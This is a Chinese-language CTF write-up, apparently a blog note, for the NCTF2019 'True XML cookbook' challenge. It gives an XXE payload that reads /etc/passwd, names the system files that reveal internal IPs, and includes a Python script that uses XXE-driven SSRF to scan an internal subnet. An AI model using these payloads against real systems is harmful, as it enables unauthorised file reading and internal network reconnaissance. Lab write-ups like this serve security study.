---
title: '[NCTF2019]True XML cookbook'
date: 2024-06-08 17:02:53
tags: xxe
categories: 刷题笔记
---

## [NCTF2019]True XML cookbook（xxe漏洞&xxe探测内网）

我们查看源码，发现依旧是个xxe漏洞

<!-- more -->

![image-20240602200728849](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022007911.png)

抓包添加外部注入实体，尝试读取/etc/passwd，可以读到东西

```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<user><username>
&xxe;
</username><password>
1
</password></user>
```

![image-20240602200931492](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022009689.png)

但当我们读取flag时，却报错了，大概是没有这个文件

那么我们可以想到xxe还有个知识点就是**探针内网**

所以第一步要先知道内网的ip

```
/etc/hosts,/proc/net/arp,/proc/net/fib_trie
```

这三个文件里存在内网的ip

![image-20240602201201797](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022012936.png)

我们读取/etc/hosts得到IP地址

```
10.244.80.129
```

我们访问这个IP地址，出现报错，说明flag并不在这一台主机上

![image-20240602201355325](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022013386.png)

我们对ip进行爆破

![image-20240602201826489](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022018645.png)

等了好久得到flag（bushi）

![img](https://img-blog.csdnimg.cn/direct/f39b501ad39145e0ad9d35eb815a7973.png)

也可用脚本爆破（这个可行）

```
import requests as res
url="http://ec34ede1-457e-4838-9c55-3f605758a2a0.node5.buuoj.cn:81/doLogin.php"
rawPayload='<?xml version="1.0"?>'\
         '<!DOCTYPE user ['\
         '<!ENTITY payload1 SYSTEM "http://10.244.80.{}">'\
         ']>'\
         '<user>'\
         '<username>'\
         '&payload1;'\
         '</username>'\
         '<password>'\
         '23'\
         '</password>'\
         '</user>'
for i in range(1,256):
    payload=rawPayload.format(i)
    #payload=rawPayload
    print(str("#{} =>").format(i),end='')
    try:
        resp=res.post(url,data=payload,timeout=0.5)
    except:
        continue
    else:
        print(resp.text,end='')
    finally:
        print('')
```
